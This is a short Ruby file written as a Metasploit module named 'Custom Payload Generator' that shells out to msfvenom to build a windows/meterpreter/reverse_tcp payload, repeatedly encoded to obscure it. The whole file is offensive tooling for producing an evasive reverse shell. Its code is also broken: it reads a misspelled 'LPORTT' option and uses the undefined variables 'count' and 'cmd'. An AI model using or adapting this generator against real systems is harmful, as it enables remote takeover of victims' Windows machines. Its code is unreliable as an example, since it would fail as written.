#!/usr/bin/env ruby

class MetasploitModule < Msf::Payload

  Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info,
        'Name'     => 'Custom Payload Generator',
        'Description' => %q{
            Automated payload creation framework that generates encoded
            shellcode with customizable obfuscation parameters.
        },
        'Author'   => [ 'Anomaliszt' ],
        'License'  => MSF_LICENSE))

        register_options(
            [
                OptString.new('LHOST', [true, 'Listener IP address']),
                OptInt.new('LPORT', [true, 'Listener port number']),
                OptString.new('ENCODER', [true, 'Encoding algorithm to apply']),
                OptInt.new('ENCODERCOUNT', [true, 'Encoding iteration cycles']),
                OptString.new('FORMAT', [true, 'Payload output format'])
            ]
        )
    end
      
    def run
        lhost = datastore['LHOST']
        lport = datastore['LPORTT']
        encoder = datastore['ENCODER']
        encoder_count = datastore['ENCODERCOUNT']
        format = datastore['FORMAT']

        print_status("Building payload with obfuscation: #{encoder}")

        command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -e #{encoder} -i #{count} -f #{format}"
        payload = `#{cmd}`

        if payload.empty?
            print_error("Payload generation unsuccessful")
        else
            print_good("Successfully created obfuscated payload: #{payload}")
        end
    end
end
